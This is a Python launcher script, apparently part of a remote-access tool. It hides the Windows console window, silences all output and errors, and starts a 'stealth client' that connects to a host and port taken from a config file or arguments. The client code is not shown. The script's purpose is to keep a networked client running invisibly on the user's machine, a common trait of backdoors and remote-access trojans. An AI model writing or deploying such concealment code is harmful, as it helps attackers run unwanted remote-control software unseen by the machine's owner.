"""
Windows-specific stealth mode with hidden console
Run with: pythonw.exe stealth_runner.pyw
"""
import sys
import os
import subprocess
import ctypes

# Hide console window on Windows
if sys.platform == 'win32':
    # Get console window handle
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    
    # SW_HIDE = 0
    hwnd = kernel32.GetConsoleWindow()
    if hwnd:
        user32.ShowWindow(hwnd, 0)

# Import after hiding window
from stealth_client import StealthClient


def run_hidden(host, port=5555):
    """Run the stealth client completely hidden"""
    client = StealthClient()
    
    try:
        # Suppress all output
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
        
        # Run stealth mode
        client.run_stealth(host, port)
        
    except:
        pass  # Silent fail


if __name__ == "__main__":
    # Read config from file or command line
    config_file = "stealth_config.txt"
    
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            lines = f.read().strip().split('\n')
            host = lines[0]
            port = int(lines[1]) if len(lines) > 1 else 5555
    elif len(sys.argv) >= 2:
        host = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 5555
    else:
        # Default config - change this
        host = "127.0.0.1"
        port = 5555
    
    run_hidden(host, port)
